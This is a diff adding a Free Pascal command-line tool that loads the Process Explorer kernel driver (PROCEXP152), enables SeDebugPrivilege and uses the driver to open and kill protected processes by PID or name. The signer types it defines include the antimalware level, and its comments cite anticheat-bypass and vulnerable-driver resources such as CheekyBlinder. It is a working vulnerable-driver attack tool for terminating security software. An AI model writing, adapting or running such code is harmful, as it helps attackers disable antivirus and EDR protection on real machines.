@@ -1,0 +1,126 @@
+{$mode delphi}
+
+program procexp;
+
+uses windows,sysutils, udrv,   procexp_utils;
+
+
+   type
+      TByteBits = bitpacked record
+        Bit0, Bit1, Bit2, Bit3, Bit4, Bit5, Bit6, Bit7: Boolean;
+      end;
+
+       _PS_PROTECTION  =  record
+          // High byte of index offset, low byte of index is bit count
+         level:uchar;
+         bits:byte;
+         //Type_	:byte; //index $0003; //: 3;
+	 //Audit:byte; //index $0301; //	: 1;
+	 //Signer:byte;// index $0701 ; //:4;
+end;
+
+
+_PS_PROTECTED_SIGNER=
+(
+    PsProtectedSignerNone = 0,
+    PsProtectedSignerAuthenticode = 1,
+    PsProtectedSignerCodeGen = 2,
+    PsProtectedSignerAntimalware = 3,
+    PsProtectedSignerLsa = 4,
+    PsProtectedSignerWindows = 5,
+    PsProtectedSignerWinTcb = 6,
+    PsProtectedSignerMax = 7
+);
+
+_PS_PROTECTED_TYPE=
+(
+    PsProtectedTypeNone = 0,
+    PsProtectedTypeProtectedLight = 1,
+    PsProtectedTypeProtected = 2,
+    PsProtectedTypeMax = 3
+);
+
+
+
+var
+dwpid:longint; //dword;
+hProtectedProcess:thandle=thandle(-1);
+
+function EnableDebugPriv(priv:string):boolean;
+var
+  NewState,prev: TTokenPrivileges;
+  luid: TLargeInteger;
+  hToken: THandle;
+  ReturnLength: DWord;
+begin
+result:=false;
+  //TOKEN_ADJUST_PRIVILEGES is just not enough...
+  if OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, hToken) then
+  begin
+   if LookupPrivilegeValue(nil, PChar(priv), luid) then
+   begin
+    NewState.PrivilegeCount:= 1;
+    NewState.Privileges[0].Luid := luid;
+    NewState.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+    fillchar(prev,sizeof(prev),0);
+    if AdjustTokenPrivileges(hToken, False, NewState, SizeOf(TTokenPrivileges), prev, ReturnLength) then
+    begin
+    result:=true;
+
+      if GetLastError = ERROR_NOT_ALL_ASSIGNED then
+        //WriteLn('Change privilege failed: Not all assigned')
+      result:=false; //finally not ... :)
+      //else WriteLn('Privileged');
+
+    end;
+    //else writeln(getlasterror);
+   end;
+    CloseHandle(hToken);
+  end;
+end;
+
+
+//https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
+//https://github.com/eclypsium/Screwed-Drivers/blob/master/DRIVERS.md
+//https://github.com/br-sn/CheekyBlinder
+begin
+if paramcount=0 then exit;
+
+if EnableDebugPriv('SeDebugPrivilege')=false then writeln('EnableDebugPriv failed');
+
+if (paramcount=2) and (paramstr(1)='load')
+   then LoadDriver (ParamStr (2),'PROCEXP152'); // LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));
+
+if (paramcount=2) and (paramstr(1)='unload')
+   then unLoadDriver ('PROCEXP152'); //UnloadDriver(stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[])) ;
+
+if (paramcount >=1) and (paramstr(1)='ps') then
+   begin
+   _EnumProc2 ();
+   exit;
+   end;
+
+if (paramcount >=1) and (paramstr(1)='kill') then
+  begin
+  hProcExpDevice:=OpenHandle('\\.\PROCEXP152');
+  if hProcExpDevice=thandle(-1) then begin writeln('driver handle failed');exit;end;
+  if TryStrToInt (paramstr(2),dwpid)= false then dwpid:=_EnumProc2 (paramstr(2));
+  //dwpid:=strtoint(ParamStr (2));
+  writeln(dwpid);
+  if dwpid=0 then exit;
+  hProtectedProcess := ProcExpOpenProtectedProcess(dwPid);
+  if hProtectedProcess =thandle(-1) then exit;
+  KillProcessHandles(hProtectedProcess);
+  exit;
+  end;
+
+
+end.
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
